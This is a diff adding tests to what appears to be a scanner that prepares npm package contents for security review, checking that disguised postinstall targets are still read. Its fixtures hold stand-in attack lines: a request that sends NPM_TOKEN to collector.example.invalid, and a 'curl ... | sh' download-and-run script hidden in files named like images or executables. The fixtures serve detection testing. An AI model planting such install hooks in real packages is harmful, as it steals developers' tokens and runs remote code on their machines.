@@ -207,6 +207,112 @@ describe("review input", () => {
     }
   });
 
+  test("install targets hidden by name, case, quotes, globs or a chained run are shown", () => {
+    const payload = "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);\n";
+    const script = "#!/bin/sh\ncurl -s https://collector.example.invalid/x | sh\n";
+
+    const cases = [
+      // a shebang runs whatever the name, and bash runs a script with a NUL in it
+      { scripts: { postinstall: "./setup.png" }, path: "setup.png", body: `${script}\0` },
+      { scripts: { postinstall: "./install.exe" }, path: "install.exe", body: script },
+      { scripts: { postinstall: "node './setup.txt'" }, path: "setup.txt", body: payload },
+      { scripts: { postinstall: "node ./pay*.txt" }, path: "payload.txt", body: payload },
+      { scripts: { postinstall: "node $PWD/payload.txt" }, path: "payload.txt", body: payload },
+      { scripts: { postinstall: "npm run setup", setup: "node ./payload.txt" }, path: "payload.txt", body: payload },
+    ];
+
+    for (const c of cases) {
+      const pkg = pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: c.scripts }), "index.js": "module.exports = 1;\n", [c.path]: c.body });
+      const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg });
+
+      expect(input.text).toContain(`=== FILE ${c.path} ===`);
+      expect(input.notRead.filter((n) => n.kind === "file")).toEqual([]);
+    }
+
+    // compiled machine code an install script runs is still listed as not read
+    const elf = packageFilesOf([
+      entry("package.json", JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: "./bin/setup" } })),
+      { path: "bin/setup", size: 8, mode: 0o755, data: new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) },
+    ]);
+
+    expect(buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: elf }).notRead).toContainEqual({ kind: "file", path: "bin/setup", reason: "binary" });
+  });
+
+  test("a guessed install target never hides code main showed, and real code that starts like a PE header is shown", () => {
+    const payload = "require('https').get('https://collector.example.invalid/');\n";
+    // a literal, quoted glob is an argument, not files the shell expands
+    const quoted = buildFilesInput({ name: "stand-in", version: "1.0.0", budgetTokens: 2000, pkg: pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: "node index.js '*.txt'" } }), "index.js": payload, "a.txt": "x".repeat(4000), "b.txt": "y".repeat(4000) }) });
+
+    expect(quoted.read).toContain("index.js");
+    expect(quoted.read).not.toContain("a.txt");
+
+    const mz = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: "node setup.js" } }), "setup.js": `MZ: ${payload}` }) });
+
+    expect(mz.read).toContain("setup.js");
+  });
+
+  test("a quoted wildcard is not a glob, and what the shell reading adds never displaces what main shows", () => {
+    const pkg = pkgOf({
+      "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", main: "index.js", scripts: { postinstall: 'node index.js "see * here"' } }),
+      "index.js": "require('./helper.js');\n",
+      "helper.js": "module.exports = 2;\n".repeat(50),
+      "see.txt": "x".repeat(6000),
+      "here.txt": "y".repeat(6000),
+    });
+
+    const input = buildFilesInput({ name: "stand-in", version: "1.0.0", budgetTokens: 1200, pkg });
+
+    expect(input.read).toContain("helper.js");
+    expect(input.read).not.toContain("see.txt");
+  });
+
+  test("install targets named with spaces, a quoted $PWD before a glob, or a binary name over plain JavaScript are shown", () => {
+    const payload = "require('https').get('https://collector.example.invalid/');\n";
+
+    for (const c of [
+      { postinstall: "node './my setup.txt'", path: "my setup.txt", body: payload },
+      { postinstall: 'node "$PWD"/pay*.txt', path: "payload.txt", body: payload },
+      { postinstall: "node setup.png", path: "setup.png", body: `MZ: ${payload}` },
+    ]) {
+      const pkg = pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: c.postinstall } }), "index.js": "module.exports = 1;\n", [c.path]: c.body });
+
+      expect(buildFilesInput({ name: "stand-in", version: "1.0.0", pkg }).text).toContain(`=== FILE ${c.path} ===`);
+    }
+  });
+
+  test("a binary-named script main never showed is read only after everything main shows", () => {
+    const script = "#!/bin/sh\necho setting up\n".repeat(300);
+
+    const pkg = pkgOf({
+      "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", main: "index.js", scripts: { preinstall: "./a.png", postinstall: "./b.png" } }),
+      "index.js": "require('./helper.js');\n",
+      "helper.js": "module.exports = 2;\n".repeat(50),
+      "a.png": script,
+      "b.png": script,
+    });
+
+    const input = buildFilesInput({ name: "stand-in", version: "1.0.0", budgetTokens: 1200, pkg });
+
+    expect(input.read).toContain("index.js");
+    expect(input.read).toContain("helper.js");
+  });
+
+  test("code with an uppercase extension is read only after what main shows", () => {
+    const big = "module.exports = 1;\n".repeat(200);
+    const pkg = pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", main: "index.js" }), "index.js": "module.exports = 1;\n", "settings.json": '{ "a": 1 }\n'.repeat(40), "A.JS": big, "B.JS": big });
+    const input = buildFilesInput({ name: "stand-in", version: "1.0.0", budgetTokens: 1200, pkg });
+
+    expect(input.read).toContain("settings.json");
+  });
+
+  test("code with an uppercase extension is code", () => {
+    const payload = "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);\n";
+    const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: pkgOf({ "package.json": "{}", "index.js": "require('./historyUtils.JS');\n", "historyUtils.JS": payload, "lib/helper.JS": payload }) });
+
+    expect(input.read).toContain("historyUtils.JS");
+    expect(input.read).toContain("lib/helper.JS");
+  });
+
   test("files where the rule-based signals fired come before plain code", () => {
     const pkg = pkgOf({
       "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", main: "index.js" }),
